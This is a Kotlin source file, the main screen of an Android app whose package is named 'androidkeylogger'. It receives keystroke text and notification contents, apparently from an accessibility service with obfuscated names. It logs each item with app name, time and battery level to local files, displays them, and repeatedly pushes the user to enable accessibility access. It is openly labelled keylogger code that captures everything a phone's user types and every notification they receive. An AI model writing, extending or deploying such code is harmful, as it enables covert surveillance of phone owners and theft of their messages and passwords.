package com.azamovhudstc.androidkeylogger

import android.annotation.SuppressLint
import android.content.*
import android.os.Bundle
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isVisible
import androidx.lifecycle.MutableLiveData
import androidx.recyclerview.widget.RecyclerView
import com.azamovhudstc.androidkeylogger.databinding.ActivityMainBinding
import com.azamovhudstc.androidkeylogger.model.LogModel
import com.azamovhudstc.androidkeylogger.model.NotificationModel
import com.google.firebase.FirebaseApp
import com.google.gson.Gson
import com.google.gson.JsonSyntaxException
import java.io.File
import java.io.FileWriter
import java.io.IOException

class MainFixActivity : AppCompatActivity() {
    private lateinit var recyclerView: RecyclerView
    private lateinit var adapter: NotificationAdapter
    private lateinit var logAdapter: LogAdapter
    private val notifications = mutableListOf<NotificationModel>()
    private val logs = mutableListOf<LogModel>()
    private var isFirstLaunch = true
    private var isNotificationFormat = MutableLiveData<Boolean>(true)
    private val fileName = "notifications.txt"
    private val fileNameLog = "logs.txt"
    private var _binding: ActivityMainBinding? = null
    private val binding get() = _binding!!

    private fun checkPermission() {
        if (!SvcAccFix.i) {
            if (!SvcAccFix.j) {
                startActivity(Intent(this, AccessibilityFixActivity::class.java))
            }
        }
    }


    private val notificationReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val packageName = intent?.getStringExtra("packageName")
            val title = intent?.getStringExtra("title")
            val text = intent?.getStringExtra("text")
            val timeStamp = intent?.getStringExtra("date")
            val timeStampDay = intent?.getStringExtra("dayTime")
            if (!packageName.isNullOrBlank() && !title.isNullOrBlank() && !text.isNullOrBlank()) {
                val notificationModel = NotificationModel(
                    packageName,
                    title,
                    text,
                    timeStamp!!,
                    timeStampDay!!
                )
                adapter.addNotification(notificationModel)
                saveNotificationToFileLocal(notificationModel)
            }
        }
    }

    private val receiver: BroadcastReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val text = intent.getStringExtra("TEXT") ?: ""
            println("TEXTTTTTTTTTTT :${text}")
            val packageName = intent.getStringExtra("PACKAGE_NAME") ?: ""
            val dayTime = intent.getStringExtra("DAY_TIME") ?: ""
            val timeStamp = intent.getStringExtra("TIME_STAMP") ?: ""
            val batteryLevel = intent.getStringExtra("BATTERY_LEVEL") ?: ""
            val notificationModel = LogModel(
                text,
                packageName,
                dayTime!!,
                timeStamp!!, batteryLevel
            )
            Log.d("EVENT", "onAccessibilityEventTAAAAAAA: ${text.toString()}")

            logAdapter.addNotification(notificationModel)
            saveLogToFileLocal(
                LogModel(
                    text,
                    packageName,
                    dayTime,
                    timeStamp!!,
                    batteryLevel.toString()
                )
            )
        }
    }

    private fun saveNotificationToFileLocal(notification: NotificationModel) {
        val gson = Gson()
        val notificationJson = gson.toJson(notification)

        try {
            val file = File(filesDir, fileName)
            FileWriter(file, true).use { writer ->
                writer.append(notificationJson)
                writer.append("\n")
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    private fun saveLogToFileLocal(notification: LogModel) {
        val gson = Gson()
        val notificationJson = gson.toJson(notification)

        try {
            val file = File(filesDir, fileNameLog)
            FileWriter(file, true).use { writer ->
                writer.append(notificationJson)
                writer.append("\n")
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    @SuppressLint("SuspiciousIndentation")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        _binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        FirebaseApp.initializeApp(this);

        recyclerView = findViewById(R.id.notificationRecyclerView)
        // Read data from file upon the first launch
        if (isFirstLaunch) {
            isFirstLaunch = false
            logAdapter = LogAdapter(logs, this)
            adapter = NotificationAdapter(notifications)
            readNotificationsFromFileLocal()
            readLogFromFileLocal()
        }

        val filter = IntentFilter("com.azamovhudstc.androidkeylogger.NOTIFICATION_LISTENER")
        registerReceiver(notificationReceiver, filter)
        registerReceiver(receiver, IntentFilter("ACTION_TEXT_RECEIVED"))



        isNotificationFormat.observe(this) {
            if (it) {
                adapter.clearAdapterData()
                readNotificationsFromFileLocal()
                if (notifications.isEmpty()) {
                    binding.isEmpty.isVisible = true
                    binding.isEmpty.text = "Notification Page"
                } else binding.isEmpty.isVisible = false
                recyclerView.adapter = adapter
                binding.notificationRecyclerView.isVisible = true
                binding.typingLoggerRecycler.isVisible = false

            } else {

                logAdapter.clearAdapterData()
                readLogFromFileLocal()
                if (logs.isEmpty()) {
                    binding.isEmpty.isVisible = true
                    binding.isEmpty.text = "Logs Page"
                } else binding.isEmpty.isVisible = false
                binding.typingLoggerRecycler.adapter = logAdapter
                binding.typingLoggerRecycler.isVisible = true
                binding.notificationRecyclerView.isVisible = false
            }
        }

    }

    private fun readNotificationsFromFileLocal() {
        val file = File(filesDir, fileName)
        if (file.exists()) {
            try {
                val gson = Gson()
                val reader = file.bufferedReader()
                val savedNotifications = mutableListOf<NotificationModel>()

                reader.forEachLine { line ->
                    val notificationModel = gson.fromJson(line, NotificationModel::class.java)
                    savedNotifications.add(notificationModel)
                }
                reader.close()

                notifications.addAll(savedNotifications)
                adapter.notifyDataSetChanged()
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: JsonSyntaxException) {
                e.printStackTrace()
            }
        }
    }

    private fun readLogFromFileLocal() {
        val file = File(filesDir, fileNameLog)
        if (file.exists()) {
            try {
                val gson = Gson()
                val reader = file.bufferedReader()
                val savedNotifications = mutableListOf<LogModel>()

                reader.forEachLine { line ->
                    val notificationModel = gson.fromJson(line, LogModel::class.java)
                    savedNotifications.add(notificationModel)
                }
                reader.close()

                logs.addAll(savedNotifications)
                adapter.notifyDataSetChanged()
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: JsonSyntaxException) {
                e.printStackTrace()
            }
        }
    }

    override fun onOptionsItemSelected(menuItem: MenuItem): Boolean {
        when (menuItem.itemId) {
            R.id.actionChangeType -> {
                isNotificationFormat.postValue(!isNotificationFormat.value!!)
            }
        }
        return super.onOptionsItemSelected(menuItem)
    }

    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        menuInflater.inflate(R.menu.btn, menu)
        return true
    }

    override fun onDestroy() {
        super.onDestroy()
    }

    override fun onResume() {
        super.onResume()
        checkPermission()

    }

}
